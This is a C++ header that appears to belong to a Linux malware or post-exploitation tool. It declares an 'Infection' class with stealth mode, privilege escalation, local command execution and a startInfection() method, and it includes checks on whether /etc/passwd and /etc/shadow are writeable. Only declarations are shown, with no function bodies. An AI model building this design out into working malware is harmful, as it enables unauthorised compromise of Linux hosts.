#include <iostream>
#include <stdio.h>
#include <fstream>
#include <stdlib.h>
#include <cstring>
#include <string.h>
//#include <string>
#include <pwd.h>
#include <grp.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <vector>
#include <sys/stat.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <ctime>
#include <experimental/filesystem>
#pragma once

struct FileInformations{
	std::string fileNameAndDir;
	std::string fileUserOwner;
	std::string fileGroupOwner;
	int fileSize;
	int fileLinks;
	int fileiNode;
	std::string filePermissions;
};

class FileUtilities{
public:
	void write2File(const char* fileName, std::string fileContent);
	void log2File(const char* fileDirectory, std::string logContent);
	char* GetActualTime();
};

struct Adapters {
	std::string AdapterName;
	char Family;
	int numberOfAdapters;
	std::string LocalIPAddress;
};


class PrivilegeEscalation{
public:
	bool checkDir(std::string fileName, bool createFile);
	bool isEtcPasswdWriteable();
	bool isEtcShadowWriteable();
	bool copyFile(std::string destination, std::string source);
	FileInformations GetFileInformations(const char* fileName);
};

class Networking {
public:
	std::vector<Adapters> adapters;	
	void enumerateAdapters();
};

class Infection : public Networking, public FileUtilities, PrivilegeEscalation {
private:
	//Variables
	std::string user;
	bool isApache2Present;
	char* KernelRelease;
	bool tryPrivilegeEscalation;
	char* KernelVersion;
	bool stealthEnabled;
	char* localLanguage;
	char* localTimeZone;
	bool canInstall;
	bool InstallRequirements;
	//Fonctions
	FileInformations GetFileInformations(const char* fileName);
	bool askForNoStealthMode();
	void askForPrivilegeEscalation();
	void GetLinuxVersion();
	void runLocalCommand(const char* commandToRun, const char* errorMessage);
	void runLocalCommand(const char* commandToRun, const char* errorMessage, const char* successMessage);
	void runLocalCommand(const char* commandToRun, const char* errorMessage, const char* successMessage, const char* vOutput);
public:
	bool startInfection();
};	